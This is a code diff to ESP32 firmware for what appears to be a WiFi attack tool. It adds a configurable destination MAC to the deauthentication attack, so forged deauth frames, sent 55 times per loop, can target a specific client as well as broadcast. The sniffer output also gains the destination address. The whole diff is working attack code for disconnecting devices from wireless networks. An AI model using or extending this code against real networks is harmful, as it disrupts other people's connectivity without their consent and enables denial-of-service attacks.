@@ -372,6 +372,8 @@ bool WiFiScan::shutdownWiFi() {
     esp_wifi_set_promiscuous(false);
     WiFi.disconnect();
     WiFi.mode(WIFI_OFF);
+
+    dst_mac = "ff:ff:ff:ff:ff:ff";
   
     esp_wifi_set_mode(WIFI_MODE_NULL);
     esp_wifi_stop();
@@ -1887,8 +1889,12 @@ void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
       Serial.print(snifferPacket->rx_ctrl.channel);
       Serial.print(" BSSID: ");
       char addr[] = "00:00:00:00:00:00";
+      char dst_addr[] = "00:00:00:00:00:00";
       getMAC(addr, snifferPacket->payload, 10);
+      getMAC(dst_addr, snifferPacket->payload, 4);
       Serial.print(addr);
+      Serial.print(" -> ");
+      Serial.print(dst_addr);
       display_string.concat(text_table4[0]);
       display_string.concat(snifferPacket->rx_ctrl.rssi);
 
@@ -2364,7 +2370,7 @@ void WiFiScan::sendProbeAttack(uint32_t currentTime) {
   }
 }
 
-void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel) {
+void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str) {
   // Itterate through all access points in list
   // Check if active
   WiFiScan::set_channel = channel;
@@ -2372,6 +2378,9 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel) {
   delay(1);
   
   // Build packet
+
+  sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
+        &deauth_frame_default[4], &deauth_frame_default[5], &deauth_frame_default[6], &deauth_frame_default[7], &deauth_frame_default[8], &deauth_frame_default[9]);
   
   deauth_frame_default[10] = bssid[0];
   deauth_frame_default[11] = bssid[1];
@@ -2395,7 +2404,7 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel) {
   packets_sent = packets_sent + 3;
 }
 
-void WiFiScan::sendDeauthAttack(uint32_t currentTime) {
+void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
   // Itterate through all access points in list
   for (int i = 0; i < access_points->size(); i++) {
 
@@ -2406,6 +2415,9 @@ void WiFiScan::sendDeauthAttack(uint32_t currentTime) {
       delay(1);
       
       // Build packet
+
+      sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
+            &deauth_frame_default[4], &deauth_frame_default[5], &deauth_frame_default[6], &deauth_frame_default[7], &deauth_frame_default[8], &deauth_frame_default[9]);
       
       deauth_frame_default[10] = access_points->get(i).bssid[0];
       deauth_frame_default[11] = access_points->get(i).bssid[1];
@@ -3189,7 +3201,7 @@ void WiFiScan::main(uint32_t currentTime)
   }
   else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
     for (int i = 0; i < 55; i++)
-      this->sendDeauthAttack(currentTime);
+      this->sendDeauthAttack(currentTime, this->dst_mac);
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
@@ -3209,7 +3221,7 @@ void WiFiScan::main(uint32_t currentTime)
   }
   else if (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) {
     for (int i = 0; i < 55; i++)
-      this->sendDeauthFrame(this->src_mac, this->set_channel);
+      this->sendDeauthFrame(this->src_mac, this->set_channel, this->dst_mac);
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
